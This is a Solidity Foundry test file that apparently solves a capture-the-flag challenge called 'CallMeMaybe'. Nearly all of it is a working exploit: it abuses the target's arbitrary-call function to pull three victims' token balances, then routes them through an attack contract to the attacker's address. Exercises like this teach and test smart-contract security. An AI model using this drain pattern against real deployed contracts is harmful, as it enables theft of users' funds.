// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import {Test, console} from "forge-std/Test.sol";
import {CallMeMaybe} from "../src/2_CallMeMaybe.sol";
import {CallMeMaybeHelper} from "../test_helper/2_CallMeMaybeSetup.sol";
import "../mocks/marqToken.sol";

contract CallMeMaybeTest is Test {
    CallMeMaybe public target;
    MarqToken public token;
    address[] public users = [address(0x01), address(0x02), address(0x03)];

    AttackContract public attackContract;

    function setUp() public {
        CallMeMaybeHelper dontpeak = new CallMeMaybeHelper();
        target = dontpeak.deployed();
        token = dontpeak.token();
        attackContract = new AttackContract(target, token);
    }

    function test_GetThisPassing_2() public {
        address hacker = address(0xBAD);
        uint256 startBalance = token.balanceOf(hacker);

        vm.startPrank(hacker);

        // Join group to pass usePooledWealth check
        token.approve(address(target), type(uint256).max);
        target.joinGroup(startBalance);

        // Transfer victim 1 funds to vulnerable contract
        address victim1 = address(0x03);
        uint256 victim1Balance = token.balanceOf(victim1);
        console.log("victim1Balance", victim1Balance);
        bytes memory victim1TransferCalldata =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim1, address(target), victim1Balance);
        target.usePooledWealth(victim1TransferCalldata, address(token));

        // Transfer victim 2 funds to vulnerable contract
        address victim2 = address(0x01);
        uint256 victim2Balance = token.balanceOf(victim2);
        console.log("victim2Balance", victim2Balance);
        bytes memory victim2TransferCalldata =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim2, address(target), victim2Balance);
        target.usePooledWealth(victim2TransferCalldata, address(token));

        // Transfer victim 2 funds to vulnerable contract
        address victim3 = address(address(0x02));
        uint256 victim3Balance = token.balanceOf(victim3);
        console.log("victim3Balance", victim3Balance);
        bytes memory victim3TransferCalldata =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim3, address(target), victim3Balance);
        target.usePooledWealth(victim3TransferCalldata, address(token));

        // approve attack contract to use token
        uint256 targetBalance = token.balanceOf(address(target));
        bytes memory approveCalldata =
            abi.encodeWithSignature("approve(address,uint256)", address(attackContract), type(uint256).max);
        target.usePooledWealth(approveCalldata, address(token));

        // Execte attack
        bytes memory heckCalldata = abi.encodeWithSignature("attack(uint256)", targetBalance);
        target.usePooledWealth(heckCalldata, address(attackContract));

        // Wire money to hacker
        attackContract.getAway(hacker, targetBalance);

        vm.stopPrank();

        console.log(token.balanceOf(hacker));

        assertGt(token.balanceOf(hacker), 301 ether);
    }
}

contract AttackContract {
    CallMeMaybe public target;
    MarqToken public token;

    constructor(CallMeMaybe _target, MarqToken _token) {
        target = _target;
        token = _token;
    }

    function attack(uint256 amount) public {
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        token.approve(msg.sender, type(uint256).max);
        // Put money into contract under this contracts balance to pass flashload check
        target.joinGroup(amount);
    }

    function getAway(address hacker, uint256 amount) public {
        target.leaveGroup();
        token.transfer(hacker, amount);
    }
}
